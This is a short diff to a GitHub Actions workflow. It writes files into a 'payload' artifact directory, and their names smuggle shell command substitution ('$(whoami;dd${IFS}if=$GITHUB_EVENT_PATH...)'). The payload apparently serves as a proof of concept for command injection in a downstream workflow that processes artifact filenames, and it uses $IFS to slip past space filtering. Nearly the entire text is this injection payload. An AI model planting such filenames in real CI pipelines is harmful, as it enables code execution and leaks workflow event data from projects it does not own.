@@ -11,8 +11,7 @@ jobs:
         run: |
           mkdir -p payload
           printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/runner.txt'
-          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(whoami).txt'
-          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(dd$IFSif=$GITHUB_EVENT_PATH$IFSof=$GITHUB_STEP_SUMMARY).txt'
+          printf 'PROOF-OF-CODE-EXECUTION\n' > 'payload/$(whoami;dd${IFS}if=$GITHUB_EVENT_PATH${IFS}of=$GITHUB_STEP_SUMMARY).txt'
           printf '135\n' > 'payload/pr_number.txt'
           ls -la payload
       - uses: actions/upload-artifact@v4
